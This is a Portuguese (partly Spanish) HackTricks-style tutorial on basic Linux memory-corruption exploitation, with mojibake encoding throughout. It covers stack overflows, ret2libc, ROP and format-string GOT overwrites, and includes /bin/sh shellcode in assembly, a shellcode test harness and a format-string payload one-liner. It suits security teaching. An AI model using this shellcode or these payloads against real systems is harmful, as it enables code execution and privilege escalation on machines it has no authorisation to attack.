# Linux Explora√ß√£o (B√°sica) (SPA)

## Linux Explora√ß√£o (B√°sica) (SPA)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **ASLR**

Aleatoriza√ß√£o de Endere√ßos

**Desativar aleatoriza√ß√£o (ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reativar aleatoriza√ß√£o GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desativar para uma execu√ß√£o** (n√£o requer root):\
setarch \`arch\` -R ./exemplo argumentos\
setarch \`uname -m\` -R ./exemplo argumentos

**Desativar prote√ß√£o de execu√ß√£o na pilha**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack exemplo.c -o exemplo

**Arquivo Core**\
ulimit -c unlimited\
gdb /exec arquivo\_core\
/etc/security/limits.conf -> \* soft core unlimited

**Texto**\
**Dados**\
**BSS**\
**Heap**

**Pilha**

**Se√ß√£o BSS**: Vari√°veis globais ou est√°ticas n√£o inicializadas
```
static int i;
```
**Se√ß√£o DATA**: Vari√°veis globais ou est√°ticas inicializadas
```
int i = 5;
```
**Se√ß√£o TEXT**: Instru√ß√µes do c√≥digo (opcodes)

**Se√ß√£o HEAP**: Buffers reservados de forma din√¢mica (malloc(), calloc(), realloc())

**Se√ß√£o STACK**: A pilha (Argumentos passados, cadeias de ambiente (env), vari√°veis locais‚Ä¶)

## **1. STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Falha de segmenta√ß√£o ou viola√ß√£o de segmento: Quando se tenta acessar um endere√ßo de mem√≥ria que n√£o foi atribu√≠do ao processo.

Para obter o endere√ßo de uma fun√ß√£o dentro de um programa, pode-se fazer:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Chamada para sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Ver interrup√ß√µes do kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; zeramos eax\
xor ebx, ebx ; ebx = 0 pois n√£o h√° argumento a passar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Executar syscall

**nasm -f elf assembly.asm** ‚Äî> Retorna um arquivo .o\
**ld assembly.o -o shellcodeout** ‚Äî> Gera um execut√°vel a partir do c√≥digo assembly e podemos extrair os opcodes com **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar que √© realmente nosso shellcode e extrair os OpCodes

**Verificar se o shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para verificar se as chamadas de sistema s√£o feitas corretamente, deve-se compilar o programa anterior e as chamadas de sistema devem aparecer em **strace ./PROGRAMA\_COMPILADO**

Ao criar shellcodes, pode-se usar um truque. A primeira instru√ß√£o √© um salto para um call. O call chama o c√≥digo original e tamb√©m coloca o EIP na pilha. Ap√≥s a instru√ß√£o call, inserimos a string que precis√°vamos, ent√£o com esse EIP podemos apontar para a string e tamb√©m continuar executando o c√≥digo.

EX **TRUQUE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando o Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Ca√ßador de Ovos:**

Consiste em um pequeno c√≥digo que percorre as p√°ginas de mem√≥ria associadas a um processo em busca da shellcode armazenada (procura por uma assinatura colocada na shellcode). √ötil nos casos em que se tem apenas um pequeno espa√ßo para injetar c√≥digo.

**Shellcodes polim√≥rficos**

Consistem em shells criptografadas que possuem um pequeno c√≥digo que as descriptografa e salta para ela, utilizando o truque de Call-Pop este seria um **exemplo de cifra de C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Atacando o Frame Pointer (EBP)**

√ötil em uma situa√ß√£o em que podemos modificar o EBP, mas n√£o o EIP.

Sabe-se que ao sair de uma fun√ß√£o, o seguinte c√≥digo assembly √© executado:
```
movl               %ebp, %esp
popl                %ebp
ret
```
```markdown
Dessa forma, se for poss√≠vel modificar o EBP ao sair de uma fun√ß√£o (fvuln) que foi chamada por outra fun√ß√£o, quando a fun√ß√£o que chamou fvuln terminar, seu EIP pode ser modificado.

Em fvuln, pode-se introduzir um EBP falso que aponte para um local onde esteja o endere√ßo da shellcode + 4 (deve-se adicionar 4 pelo pop). Assim, ao sair da fun√ß√£o, ser√° colocado no ESP o valor de &(\&Shellcode)+4, com o pop ser√£o subtra√≠dos 4 do ESP e este apontar√° para o endere√ßo da shellcode quando o ret for executado.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + preenchimento + &(\&Shellcode)+4

**Off-by-One Exploit**\
Permite-se modificar apenas o byte menos significativo do EBP. Pode-se realizar um ataque como o anterior, mas a mem√≥ria que guarda o endere√ßo da shellcode deve compartilhar os 3 primeiros bytes com o EBP.

## **4. M√©todos return to Libc**

M√©todo √∫til quando a stack n√£o √© execut√°vel ou deixa um buffer muito pequeno para modificar.

O ASLR faz com que em cada execu√ß√£o as fun√ß√µes sejam carregadas em posi√ß√µes diferentes da mem√≥ria. Portanto, este m√©todo pode n√£o ser eficaz nesse caso. Para servidores remotos, como o programa est√° sendo executado constantemente no mesmo endere√ßo, pode ser √∫til.

* **cdecl(C declaration)** Coloca os argumentos na stack e ap√≥s sair da fun√ß√£o limpa a pilha
* **stdcall(standard call)** Coloca os argumentos na pilha e √© a fun√ß√£o chamada que a limpa
* **fastcall** Coloca os dois primeiros argumentos em registros e o resto na pilha

Coloca-se o endere√ßo da instru√ß√£o system da libc e passa-se como argumento a string ‚Äú/bin/sh‚Äù, normalmente de uma vari√°vel de ambiente. Al√©m disso, usa-se o endere√ßo da fun√ß√£o exit para que, uma vez que a shell n√£o seja mais necess√°ria, o programa saia sem causar problemas (e escrever logs).

**export SHELL=/bin/sh**

Para encontrar os endere√ßos que precisaremos, pode-se olhar dentro do **GDB:**\
**p system**\
**p exit**\
**rabin2 -i execut√°vel** ‚Äî> Fornece o endere√ßo de todas as fun√ß√µes que o programa usa ao carregar\
(Dentro de um start ou algum breakpoint): **x/500s $esp** ‚Äî> Procuramos aqui a string /bin/sh

Uma vez que tenhamos esses endere√ßos, o **exploit** seria:

‚ÄúA‚Äù \* DIST√ÇNCIA EBP + 4 (EBP: podem ser 4 "A"s, embora seja melhor se for o EBP real para evitar falhas de segmenta√ß√£o) + Endere√ßo de **system** (sobrescrever√° o EIP) + Endere√ßo de **exit** (ao sair de system(‚Äú/bin/sh‚Äù) esta fun√ß√£o ser√° chamada, pois os primeiros 4 bytes da stack s√£o tratados como o pr√≥ximo endere√ßo do EIP a ser executado) + Endere√ßo de ‚Äú**/bin/sh**‚Äù (ser√° o par√¢metro passado para system)

Dessa forma, o EIP ser√° sobrescrito com o endere√ßo de system, que receber√° como par√¢metro a string ‚Äú/bin/sh‚Äù e, ao sair desta, executar√° a fun√ß√£o exit().

Pode-se encontrar a situa√ß√£o em que algum byte do endere√ßo de alguma fun√ß√£o seja nulo ou espa√ßo (\x20). Nesse caso, podem-se desmontar os endere√ßos anteriores a essa fun√ß√£o, pois provavelmente haver√° v√°rios NOPs que nos permitir√£o chamar algum deles em vez da fun√ß√£o diretamente (por exemplo, com > x/8i system-4).

Este m√©todo funciona porque, ao chamar uma fun√ß√£o como system usando o opcode **ret** em vez de **call**, a fun√ß√£o entende que os primeiros 4 bytes ser√£o o endere√ßo **EIP** para o qual retornar.

Uma t√©cnica interessante com este m√©todo √© chamar **strncpy()** para mover um payload da stack para o heap e, posteriormente, usar **gets()** para executar esse payload.

Outra t√©cnica interessante √© o uso de **mprotect()**, que permite atribuir as permiss√µes desejadas a qualquer parte da mem√≥ria. Serve ou servia em BSD, MacOS e OpenBSD, mas n√£o em linux (controla que n√£o se possam conceder ao mesmo tempo permiss√µes de escrita e execu√ß√£o). Com este ataque, poderia-se reconfigurar a stack como execut√°vel.

**Encadeamento de fun√ß√µes**

Baseando-nos na t√©cnica anterior, esta forma de exploit consiste em:\
Preenchimento + \&Fun√ß√£o1 + \&pop;ret; + \&arg_fun1 + \&Fun√ß√£o2 + \&pop;ret; + \&arg_fun2 + ‚Ä¶

Dessa forma, podem-se encadear fun√ß√µes a serem chamadas. Al√©m disso, se quiser usar fun√ß√µes com v√°rios argumentos, podem-se colocar os argumentos necess√°rios (ex. 4) e colocar os 4 argumentos e procurar um endere√ßo com os opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d execut√°vel**

**Encadeamento por falsifica√ß√£o de frames (encadeamento de EBPs)**

Consiste em aproveitar a capacidade de manipular o EBP para encadear a execu√ß√£o de v√°rias fun√ß√µes atrav√©s do EBP e de "leave;ret"

PREENCHIMENTO

* Colocamos no EBP um EBP falso que aponta para: 2¬∫ EBP_falso + a fun√ß√£o a ser executada: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* No EIP colocamos o endere√ßo de uma fun√ß√£o &(leave;ret)

Iniciamos a shellcode com o endere√ßo para a pr√≥xima parte da shellcode, por exemplo: 2¬∫EBP_falso + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

O 2¬∫EBP seria: 3¬∫EBP_falso + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Esta shellcode pode ser repetida indefinidamente nas partes da mem√≥ria √†s quais se tem acesso, de forma que se consiga uma shellcode facilmente divis√≠vel por pequenos peda√ßos de mem√≥ria.

(Encadeia-se a execu√ß√£o de fun√ß√µes misturando as vulnerabilidades vistas anteriormente de EBP e de ret2lib)

## **5.M√©todos complementares**

**Ret2Ret**

√ötil quando n√£o se pode colocar um endere√ßo da stack no EIP (verifica-se que o EIP n√£o contenha 0xbf) ou quando n√£o se pode calcular a localiza√ß√£o da shellcode. No entanto, a fun√ß√£o vulner√°vel aceita um par√¢metro (a shellcode ir√° aqui).

Dessa forma, ao mudar o EIP para um endere√ßo de um **ret**, carregar-se-√° o endere√ßo seguinte (que √© o endere√ßo do primeiro argumento da fun√ß√£o). Ou seja, carregar-se-√° a shellcode.

O exploit seria: SHELLCODE + Preenchimento (at√© EIP) + **\&ret** (os bytes seguintes da pilha apontam para o in√≠cio da shellcode, pois se coloca na stack o endere√ßo do par√¢metro passado)

Parece que fun√ß√µes como **strncpy** uma vez completas eliminam da pilha o endere√ßo onde estava guardada a shellcode, impossibilitando esta t√©cnica. Ou seja, o endere√ßo que passam √† fun√ß√£o como argumento (o que guarda a shellcode) √© modificado por um 0x00, ent√£o ao chamar o segundo **ret** encontra-se com um 0x00 e o programa termina.
```
```
**Ret2PopRet**
```
Se n√£o temos controle sobre o primeiro argumento, mas sim sobre o segundo ou o terceiro, podemos sobrescrever o EIP com um endere√ßo para pop-ret ou pop-pop-ret, conforme necess√°rio.

**T√©cnica de Murat**

No Linux, todos os programas s√£o mapeados come√ßando em 0xbfffffff

Observando como a pilha de um novo processo no Linux √© constru√≠da, √© poss√≠vel desenvolver um exploit de forma que o programa seja iniciado em um ambiente cuja √∫nica vari√°vel seja a shellcode. O endere√ßo desta pode ser calculado como: addr = 0xbfffffff - 4 - strlen(NOME\_execut√°vel\_completo) - strlen(shellcode)

Dessa maneira, obt√©m-se de forma simples o endere√ßo onde est√° a vari√°vel de ambiente com a shellcode.

Isso √© poss√≠vel gra√ßas ao fato de que a fun√ß√£o execle permite criar um ambiente que contenha apenas as vari√°veis de ambiente desejadas.

**Jump to ESP: Estilo Windows**

Como o ESP sempre aponta para o in√≠cio da pilha, esta t√©cnica consiste em substituir o EIP pelo endere√ßo de uma chamada a **jmp esp** ou **call esp**. Assim, a shellcode √© armazenada ap√≥s a sobrescritura do EIP, pois ap√≥s a execu√ß√£o do **ret**, o ESP estar√° apontando para o endere√ßo seguinte, exatamente onde a shellcode foi guardada.

Se o ASLR n√£o estiver ativo no Windows ou Linux, pode-se chamar **jmp esp** ou **call esp** armazenadas em algum objeto compartilhado. Se o ASLR estiver ativo, pode-se procurar dentro do pr√≥prio programa vulner√°vel.

Al√©m disso, o fato de poder colocar a shellcode ap√≥s a corrup√ß√£o do EIP, em vez de no meio da pilha, evita que instru√ß√µes push ou pop executadas durante a fun√ß√£o afetem a shellcode (o que poderia acontecer se estivesse no meio da pilha da fun√ß√£o).

De forma muito semelhante, se soubermos que uma fun√ß√£o retorna o endere√ßo onde a shellcode est√° armazenada, podemos chamar **call eax** ou **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) ou borrowed code chunks**

Os peda√ßos de c√≥digo que s√£o invocados s√£o conhecidos como gadgets.

Esta t√©cnica consiste em encadear diferentes chamadas a fun√ß√µes usando a t√©cnica de **ret2libc** e o uso de **pop, ret**.

Em algumas arquiteturas de processadores, cada instru√ß√£o √© um conjunto de 32 bits (MIPS, por exemplo). No entanto, na Intel, as instru√ß√µes t√™m tamanhos vari√°veis e v√°rias instru√ß√µes podem compartilhar um conjunto de bits, por exemplo:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Cont√©m os bytes 0xffe4 que tamb√©m se traduzem por: **jmp \*%esp**

Assim, √© poss√≠vel executar algumas instru√ß√µes que nem sequer est√£o no programa original.

**ROPgadget.py** nos ajuda a encontrar valores em bin√°rios.

Este programa tamb√©m √© √∫til para criar os **payloads**. Voc√™ pode especificar a biblioteca da qual deseja extrair os ROPs e ele gerar√° um payload em Python. Voc√™ fornece o endere√ßo onde a biblioteca est√° e o payload est√° pronto para ser usado como shellcode. Al√©m disso, como usa chamadas ao sistema, n√£o executa nada na pilha, apenas armazena endere√ßos de ROPs que ser√£o executados por meio de **ret**. Para usar este payload, deve-se chamar o payload por uma instru√ß√£o **ret**.

**Integer overflows**

Este tipo de overflow ocorre quando uma vari√°vel n√£o est√° preparada para suportar um n√∫mero t√£o grande quanto o fornecido, possivelmente devido a uma confus√£o entre vari√°veis com e sem sinal, por exemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
**Vari√°veis n√£o inicializadas**

N√£o se sabe o valor que uma vari√°vel n√£o inicializada pode assumir, e pode ser interessante observ√°-lo. Pode acontecer de ela assumir o valor que uma vari√°vel de uma fun√ß√£o anterior tinha, e essa vari√°vel anterior pode ser controlada pelo atacante.

## **Format Strings**

Em C, **`printf`** √© uma fun√ß√£o que pode ser usada para **imprimir** uma string. O **primeiro par√¢metro** que esta fun√ß√£o espera √© o **texto bruto com os formatadores**. Os **par√¢metros seguintes** esperados s√£o os **valores** para **substituir** os **formatadores** no texto bruto.

A vulnerabilidade aparece quando um **texto do atacante √© colocado como o primeiro argumento** nesta fun√ß√£o. O atacante poder√° criar uma **entrada especial abusando** das capacidades da string de formato do **printf** para **escrever qualquer dado em qualquer endere√ßo**. Sendo capaz, dessa forma, de **executar c√≥digo arbitr√°rio**.

Formatadores:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **escreve** o **n√∫mero de bytes escritos** no **endere√ßo indicado. Escrever** tantos **bytes** quanto o n√∫mero hexadecimal que **precisamos** escrever √© como voc√™ pode **escrever qualquer dado**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Esta √© a tabela que cont√©m o **endere√ßo** para as **fun√ß√µes externas** usadas pelo programa.

Obtenha o endere√ßo desta tabela com: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observe como, ap√≥s **carregar** o **execut√°vel** no GEF, voc√™ pode **ver** as **fun√ß√µes** que est√£o no **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Usando o GEF, voc√™ pode **iniciar** uma sess√£o de **depura√ß√£o** e executar **`got`** para ver a tabela got:

![](<../../.gitbook/assets/image (621).png>)

Em um bin√°rio, o GOT tem os **endere√ßos das fun√ß√µes ou** para a se√ß√£o **PLT** que carregar√° o endere√ßo da fun√ß√£o. O objetivo deste exploit √© **sobrescrever a entrada do GOT** de uma fun√ß√£o que ser√° executada mais tarde **com** o **endere√ßo** da PLT da **fun√ß√£o `system`**. Idealmente, voc√™ vai **sobrescrever** o **GOT** de uma **fun√ß√£o** que **ser√° chamada com par√¢metros controlados por voc√™** (assim voc√™ poder√° controlar os par√¢metros enviados para a fun√ß√£o system).

Se **`system`** **n√£o for usada** pelo script, a fun√ß√£o system **n√£o** ter√° uma entrada no GOT. Neste cen√°rio, voc√™ precisar√° **vazar primeiro o endere√ßo** da fun√ß√£o `system`.

**Procedure Linkage Table** √© uma tabela **somente leitura** no arquivo ELF que armazena todos os **s√≠mbolos que precisam de resolu√ß√£o**. Quando uma dessas fun√ß√µes √© chamada, o **GOT** ir√° **redirecionar** o **fluxo** para o **PLT** para que possa **resolver** o **endere√ßo** da fun√ß√£o e escrev√™-lo no GOT.
Ent√£o, na **pr√≥xima vez** que uma chamada for realizada para aquele endere√ßo, a **fun√ß√£o** √© **chamada diretamente** sem precisar resolv√™-la.

Voc√™ pode ver os endere√ßos do PLT com **`objdump -j .plt -d ./vuln_binary`**

### **Fluxo do Exploit**

Como explicado anteriormente, o objetivo √© **sobrescrever** o **endere√ßo** de uma **fun√ß√£o** na tabela **GOT** que ser√° chamada mais tarde. Idealmente, poder√≠amos definir o **endere√ßo para um shellcode** localizado em uma se√ß√£o execut√°vel, mas provavelmente voc√™ n√£o conseguir√° escrever um shellcode em uma se√ß√£o execut√°vel.
Portanto, uma op√ß√£o diferente √© **sobrescrever** uma **fun√ß√£o** que **recebe** seus **argumentos** do **usu√°rio** e **apont√°-la** para a **fun√ß√£o `system`**.

Para escrever o endere√ßo, geralmente s√£o feitos 2 passos: Voc√™ **escreve primeiro 2Bytes** do endere√ßo e depois os outros 2. Para fazer isso, **`$hn`** √© usado.

**HOB** √© chamado para os 2 bytes superiores do endere√ßo\
**LOB** √© chamado para os 2 bytes inferiores do endere√ßo

Ent√£o, por causa de como a string de formato funciona, voc√™ precisa **escrever primeiro o menor** entre \[HOB, LOB] e depois o outro.

Se HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Se HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 N¬∫Param_dir_HOB LOB_shell-HOB_shell N¬∫Param_dir_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Modelo de Exploit de String de Formato**

Voc√™ pode encontrar um **modelo** para explorar o GOT usando strings de formato aqui:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini_array**

Essencialmente, esta √© uma estrutura com **fun√ß√µes que ser√£o chamadas** antes do programa terminar. Isso √© interessante se voc√™ puder chamar seu **shellcode apenas pulando para um endere√ßo**, ou em casos em que voc√™ precisa voltar ao main novamente para **explorar a string de formato uma segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Note que isso **n√£o** **criar√°** um **loop eterno** porque quando voc√™ voltar para o main, o canary perceber√°, o fim da pilha pode estar corrompido e a fun√ß√£o n√£o ser√° chamada novamente. Ent√£o, com isso, voc√™ ser√° capaz de **ter mais 1 execu√ß√£o** da vulnerabilidade.

### **Format Strings para Despejar Conte√∫do**

Uma string de formata√ß√£o tamb√©m pode ser abusada para **despejar conte√∫do** da mem√≥ria do programa.\
Por exemplo, na seguinte situa√ß√£o h√° uma **vari√°vel local na pilha apontando para uma flag.** Se voc√™ **encontrar** onde na **mem√≥ria** o **ponteiro** para a **flag** est√°, voc√™ pode fazer o **printf acessar** esse **endere√ßo** e **imprimir** a **flag**:

Ent√£o, a flag est√° em **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E do vazamento voc√™ pode ver o **ponteiro para a flag** est√° no **8¬∫** par√¢metro:

![](<../../.gitbook/assets/image (623).png>)

Ent√£o, **acessando** o **8¬∫ par√¢metro** voc√™ pode obter a flag:

![](<../../.gitbook/assets/image (624).png>)

Note que seguindo o **exploit anterior** e percebendo que voc√™ pode **vazar conte√∫do**, voc√™ pode **definir ponteiros** para **`printf`** para a se√ß√£o onde o **execut√°vel** est√° **carregado** e **despejar** ele **inteiramente**!

### **DTOR**

{% hint style="danger" %}
Hoje em dia √© muito **raro encontrar um bin√°rio com uma se√ß√£o dtor**.
{% endhint %}

Os destrutores s√£o fun√ß√µes que s√£o **executadas antes do programa terminar**.\
Se voc√™ conseguir **escrever** um **endere√ßo** para um **shellcode** em **`__DTOR_END__`**, isso ser√° **executado** antes do programa terminar.\
Obtenha o endere√ßo desta se√ß√£o com:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Geralmente, voc√™ encontrar√° a se√ß√£o **DTOR** **entre** os valores `ffffffff` e `00000000`. Ent√£o, se voc√™ apenas ver esses valores, significa que **n√£o h√° nenhuma fun√ß√£o registrada**. Portanto, **sobrescreva** o **`00000000`** com o **endere√ßo** para o **shellcode** para execut√°-lo.

### **Format Strings para Buffer Overflows**

O **sprintf move** uma string formatada **para** uma **vari√°vel**. Portanto, voc√™ pode abusar do **formato** de uma string para causar um **buffer overflow na vari√°vel** onde o conte√∫do √© copiado.\
Por exemplo, o payload `%.44xAAAA` ir√° **escrever 44B+"AAAA" na vari√°vel**, o que pode causar um buffer overflow.

### **\_\_atexit Structures**

{% hint style="danger" %}
Hoje em dia √© muito **estranho explorar isso**.
{% endhint %}

**`atexit()`** √© uma fun√ß√£o √† qual **outras fun√ß√µes s√£o passadas como par√¢metros**. Essas **fun√ß√µes** ser√£o **executadas** ao executar um **`exit()`** ou o **retorno** do **main**.\
Se voc√™ conseguir **modificar** o **endere√ßo** de qualquer uma dessas **fun√ß√µes** para apontar para um shellcode, por exemplo, voc√™ ganhar√° **controle** do **processo**, mas isso atualmente √© mais complicado.\
Atualmente, os **endere√ßos das fun√ß√µes** a serem executadas est√£o **ocultos** atr√°s de v√°rias estruturas e, finalmente, o endere√ßo para o qual apontam n√£o s√£o os endere√ßos das fun√ß√µes, mas s√£o **criptografados com XOR** e deslocamentos com uma **chave aleat√≥ria**. Portanto, atualmente esse vetor de ataque √© **n√£o muito √∫til pelo menos em x86** e **x64\_86**.\
A **fun√ß√£o de criptografia** √© **`PTR_MANGLE`**. **Outras arquiteturas** como m68k, mips32, mips64, aarch64, arm, hppa... **n√£o implementam a fun√ß√£o de criptografia** porque ela **retorna o mesmo** que recebeu como entrada. Ent√£o, essas arquiteturas seriam atac√°veis por esse vetor.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Hoje em dia √© muito **estranho explorar isso**.
{% endhint %}

**`Setjmp()`** permite **salvar** o **contexto** (os registradores)\
**`longjmp()`** permite **restaurar** o **contexto**.\
Os **registradores salvos** s√£o: `EBX, ESI, EDI, ESP, EIP, EBP`\
O que acontece √© que EIP e ESP s√£o passados pela fun√ß√£o **`PTR_MANGLE`**, ent√£o as **arquiteturas vulner√°veis a esse ataque s√£o as mesmas mencionadas acima**.\
Eles s√£o √∫teis para recupera√ß√£o de erros ou interrup√ß√µes.\
No entanto, pelo que li, os outros registradores n√£o s√£o protegidos, **ent√£o se houver um `call ebx`, `call esi` ou `call edi`** dentro da fun√ß√£o sendo chamada, o controle pode ser assumido. Ou voc√™ tamb√©m poderia modificar o EBP para modificar o ESP.

**VTable e VPTR em C++**

Cada classe tem uma **Vtable** que √© um array de **ponteiros para m√©todos**.

Cada objeto de uma **classe** tem um **VPtr** que √© um **ponteiro** para o array de sua classe. O VPtr faz parte do cabe√ßalho de cada objeto, ent√£o se uma **sobrescrita** do **VPtr** for alcan√ßada, ele poderia ser **modificado** para **apontar** para um m√©todo fict√≠cio para que a execu√ß√£o de uma fun√ß√£o fosse para o shellcode.

## **Medidas preventivas e evas√µes**

**ASLR n√£o t√£o aleat√≥rio**

PaX divide o espa√ßo de endere√ßamento do processo em 3 grupos:

C√≥digo e dados iniciados e n√£o iniciados: .text, .data e .bss ‚Äî> 16bits de entropia na vari√°vel delta\_exec, esta vari√°vel √© iniciada aleatoriamente com cada processo e √© somada √†s dire√ß√µes iniciais

Mem√≥ria alocada por mmap() e bibliotecas compartilhadas ‚Äî> 16bits, delta\_mmap

A pilha ‚Äî> 24bits, delta\_stack ‚Äî> Realmente 11 (do 10¬∫ ao 20¬∫ byte inclusivo) ‚Äî> alinhado a 16bytes ‚Äî> 524.288 poss√≠veis endere√ßos reais da pilha

As vari√°veis de ambiente e os argumentos se deslocam menos que um buffer na pilha.

**Return-into-printf**

√â uma t√©cnica para converter um buffer overflow em um erro de string formatada. Consiste em substituir o EIP para que aponte para um printf da fun√ß√£o e passar como argumento uma string formatada manipulada para obter valores sobre o estado do processo.

**Ataque a bibliotecas**

